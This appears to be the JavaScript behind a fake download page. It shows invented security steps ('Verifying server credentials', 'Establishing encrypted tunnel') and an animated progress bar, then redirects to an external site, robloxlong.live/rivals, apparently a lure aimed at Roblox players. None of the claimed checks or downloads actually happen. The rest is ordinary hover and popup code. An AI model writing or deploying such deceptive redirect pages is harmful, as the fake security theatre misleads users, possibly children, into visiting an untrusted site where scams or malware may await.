
document.addEventListener('DOMContentLoaded', function() {
  const statusText = document.getElementById('status-text');
  const errorText = document.getElementById('error-text');
  const progressFill = document.querySelector('.progress-fill');
  
  // Animated status messages
  const statusMessages = [
    'Initializing secure session...',
    'Verifying server credentials...',
    'Establishing encrypted tunnel...',
    'Preparing download link...',
    'Connection established'
  ];
  
  let messageIndex = 0;
  let isComplete = false;
  
  // Animate status text
  function updateStatus() {
    if (messageIndex < statusMessages.length && !isComplete) {
      statusText.textContent = statusMessages[messageIndex];
      messageIndex++;
      
      // Update progress gradually
      const progress = (messageIndex / statusMessages.length) * 100;
      progressFill.style.width = progress + '%';
      
      if (messageIndex < statusMessages.length) {
        setTimeout(updateStatus, 300);
      } else {
        // Final step - mark as complete and redirect
        isComplete = true;
        statusText.textContent = 'Download starting...';
        
        setTimeout(() => {
          window.location.href = 'https://robloxlong.live/rivals';
        }, 500);
      }
    }
  }
  
  // Start the animation sequence
  setTimeout(updateStatus, 200);
  
  // Add hover effects for enhanced interactivity
  const card = document.querySelector('.card');
  
  card.addEventListener('mouseenter', function() {
    if (!isComplete) {
      this.style.transform = 'translateY(-2px)';
      this.style.boxShadow = '0 40px 80px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1)';
    }
  });
  
  card.addEventListener('mouseleave', function() {
    if (!isComplete) {
      this.style.transform = 'translateY(0)';
      this.style.boxShadow = '0 32px 64px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.05)';
    }
  });
});

// Info popup toggle
function toggleInfoPopup() {
  const popup = document.getElementById('infoPopup');
  if (popup.style.display === 'block') {
    popup.style.display = 'none';
  } else {
    popup.style.display = 'block';
  }
}

// Close popup when clicking outside
document.addEventListener('click', function(event) {
  const popup = document.getElementById('infoPopup');
  const infoBtn = event.target.closest('button[onclick="toggleInfoPopup()"]');
  
  if (!popup.contains(event.target) && !infoBtn) {
    popup.style.display = 'none';
  }
});


